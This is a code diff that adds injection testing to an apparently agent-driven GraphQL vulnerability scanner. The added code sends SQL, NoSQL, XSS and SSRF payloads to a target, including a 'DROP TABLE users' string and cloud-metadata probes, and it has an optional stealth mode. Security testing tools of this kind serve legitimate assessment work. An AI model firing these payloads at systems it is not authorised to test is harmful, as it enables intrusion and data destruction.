@@ -433,6 +433,146 @@ def _test_schema_stitching(endpoint: str) -> dict:
     return {"vulnerable": False}
 
 
+def _test_injection(endpoint: str) -> dict:
+    """Test GraphQL injection vulnerabilities."""
+    findings = []
+
+    # ── SQL Injection via GraphQL ─────────────────────────────────────────────
+    sql_payloads = [
+        "{ user(id: \"1' OR '1'='1\") { id email } }",
+        "{ user(id: \"1' UNION SELECT NULL,NULL,NULL--\") { id email } }",
+        "{ user(id: \"1; DROP TABLE users--\") { id email } }",
+        "{ user(name: \"test' OR '1'='1\") { id email } }",
+        "{ user(email: \"test@test.com' OR '1'='1\") { id email } }",
+    ]
+
+    for payload in sql_payloads:
+        try:
+            rate_limiter.wait(_domain_of(endpoint))
+            resp = requests.post(
+                endpoint,
+                json={"query": payload},
+                headers={"Content-Type": "application/json"},
+                timeout=5,
+                verify=False,
+            )
+
+            data = resp.json()
+            # Check for SQL error indicators
+            error_text = str(data.get("errors", "")).lower()
+            sql_indicators = ["sql", "syntax", "mysql", "postgresql", "sqlite", "ora-"]
+            if any(ind in error_text for ind in sql_indicators):
+                findings.append({
+                    "type": "GraphQL SQL Injection",
+                    "severity": "Critical",
+                    "query": payload[:100],
+                    "detail": f"SQL error detected in GraphQL response: {error_text[:200]}",
+                })
+                exec_logger.add_log("GraphQL Tester", "WARNING", f"SQL injection via GraphQL: {payload[:50]}")
+                break
+        except Exception:
+            pass
+
+    # ── NoSQL Injection via GraphQL ───────────────────────────────────────────
+    nosql_payloads = [
+        '{ user(id: {"$gt": ""}) { id email } }',
+        '{ user(name: {"$ne": ""}) { id email } }',
+        '{ user(email: {"$regex": ".*"}) { id email } }',
+        '{ user(id: {"$where": "this.password"}) { id email } }',
+    ]
+
+    for payload in nosql_payloads:
+        try:
+            rate_limiter.wait(_domain_of(endpoint))
+            resp = requests.post(
+                endpoint,
+                json={"query": payload},
+                headers={"Content-Type": "application/json"},
+                timeout=5,
+                verify=False,
+            )
+
+            data = resp.json()
+            # Check if query returned data (injection successful)
+            if "data" in data and data["data"]:
+                inner = list(data["data"].values())
+                if inner and inner[0] is not None:
+                    findings.append({
+                        "type": "GraphQL NoSQL Injection",
+                        "severity": "Critical",
+                        "query": payload[:100],
+                        "detail": "NoSQL injection returned data — operator injection successful",
+                    })
+                    exec_logger.add_log("GraphQL Tester", "WARNING", f"NoSQL injection via GraphQL: {payload[:50]}")
+                    break
+        except Exception:
+            pass
+
+    # ── XSS via GraphQL ───────────────────────────────────────────────────────
+    xss_payloads = [
+        '{ user(id: "1") { name } }<script>alert(1)</script>',
+        '{ user(id: "1<img src=x onerror=alert(1)>") { name } }',
+        '{ user(id: "1\" onmouseover=\"alert(1)\") { name } }',
+    ]
+
+    for payload in xss_payloads:
+        try:
+            rate_limiter.wait(_domain_of(endpoint))
+            resp = requests.post(
+                endpoint,
+                json={"query": payload},
+                headers={"Content-Type": "application/json"},
+                timeout=5,
+                verify=False,
+            )
+
+            # Check if XSS payload reflected in response
+            if "<script>" in resp.text or "alert(" in resp.text or "onerror=" in resp.text:
+                findings.append({
+                    "type": "GraphQL XSS",
+                    "severity": "High",
+                    "query": payload[:100],
+                    "detail": "XSS payload reflected in GraphQL response",
+                })
+                exec_logger.add_log("GraphQL Tester", "WARNING", f"XSS via GraphQL: {payload[:50]}")
+                break
+        except Exception:
+            pass
+
+    # ── SSRF via GraphQL ──────────────────────────────────────────────────────
+    ssrf_payloads = [
+        '{ user(id: "1") { name } } @rest(url: "http://169.254.169.254/") { __typename }',
+        '{ internalData @http(url: "http://127.0.0.1/") { __typename } }',
+    ]
+
+    for payload in ssrf_payloads:
+        try:
+            rate_limiter.wait(_domain_of(endpoint))
+            resp = requests.post(
+                endpoint,
+                json={"query": payload},
+                headers={"Content-Type": "application/json"},
+                timeout=5,
+                verify=False,
+            )
+
+            # Check for SSRF indicators
+            ssrf_indicators = ["ami-id", "instance-id", "local-ipv4", "169.254"]
+            if any(ind in resp.text for ind in ssrf_indicators):
+                findings.append({
+                    "type": "GraphQL SSRF",
+                    "severity": "Critical",
+                    "query": payload[:100],
+                    "detail": "SSRF via GraphQL directive — internal metadata accessible",
+                })
+                exec_logger.add_log("GraphQL Tester", "WARNING", f"SSRF via GraphQL: {payload[:50]}")
+                break
+        except Exception:
+            pass
+
+    return findings
+
+
 @tool("graphql_tester")
 def graphql_tester(target_url: str) -> str:
     """
@@ -528,6 +668,12 @@ def graphql_tester(target_url: str) -> str:
     if stitching.get("vulnerable"):
         all_findings.append(stitching)
 
+    # Step 10: Injection Testing
+    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN."
+    exec_logger.add_log("GraphQL Tester", "PROCESSING", "Testing injection vectors (SQLi, NoSQLi, XSS, SSRF)")
+    injection_findings = _test_injection(endpoint)
+    all_findings.extend(injection_findings)
+
     # Build report
     exec_logger.add_log("GraphQL Tester", "SUCCESS", f"GraphQL testing selesai. Findings: {len(all_findings)}")
 
@@ -561,5 +707,81 @@ def graphql_tester(target_url: str) -> str:
         output += "\n[+] Not found kerentanan GraphQL yang obvious. GraphQL implementation tampak cukup hardened.\n"
 
     output += "\n⚠️  Manual verification tetap required untuk konfirmasi semua findings.\n"
+
+    # ── GRAPHQL-COP CONFIRMATION STEP ─────────────────────────────────────────
+    if not check_cancelled(exec_logger):
+        exec_logger.add_log("GraphQL Tester", "PROCESSING", "Running graphql-cop for additional testing")
+        try:
+            import subprocess
+            import tempfile
+            import os
+
+            # Create temp output file
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
+                output_file = f.name
+
+            # Run graphql-cop
+            cmd = [
+                "python3",
+                "/opt/graphql-cop/graphql-cop.py",
+                "-t", endpoint,
+                "-o", output_file,
+                "-q",  # Quiet mode
+            ]
+
+            # Apply stealth mode
+            if os.environ.get("STEALTH_MODE", "0") == "1":
+                cmd.append("--delay")
+
+            result = subprocess.run(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                timeout=120,
+            )
+
+            # Parse graphql-cop output
+            graphql_cop_findings = []
+            if os.path.exists(output_file):
+                try:
+                    import json
+                    with open(output_file, 'r') as f:
+                        data = json.load(f)
+                        if isinstance(data, list):
+                            for item in data:
+                                graphql_cop_findings.append({
+                                    "type": f"GraphQL-Cop: {item.get('test', 'Unknown')}",
+                                    "severity": item.get("severity", "Medium"),
+                                    "detail": item.get("result", ""),
+                                })
+                except Exception:
+                    pass
+                finally:
+                    try:
+                        os.unlink(output_file)
+                    except:
+                        pass
+
+            # Also parse stdout for findings
+            for line in result.stdout.split('\n'):
+                if 'VULNERABLE' in line or 'HIGH' in line or 'MEDIUM' in line:
+                    graphql_cop_findings.append({
+                        "type": "GraphQL-Cop Finding",
+                        "severity": "High" if "HIGH" in line else "Medium",
+                        "detail": line.strip(),
+                    })
+
+            if graphql_cop_findings:
+                all_findings.extend(graphql_cop_findings)
+                exec_logger.add_log("GraphQL Tester", "WARNING",
+                    f"graphql-cop found {len(graphql_cop_findings)} additional findings")
+
+        except subprocess.TimeoutExpired:
+            exec_logger.add_log("GraphQL Tester", "WARNING", "graphql-cop timed out")
+        except FileNotFoundError:
+            exec_logger.add_log("GraphQL Tester", "WARNING", "graphql-cop not found")
+        except Exception as e:
+            exec_logger.add_log("GraphQL Tester", "WARNING", f"graphql-cop error: {str(e)[:100]}")
 
     return output
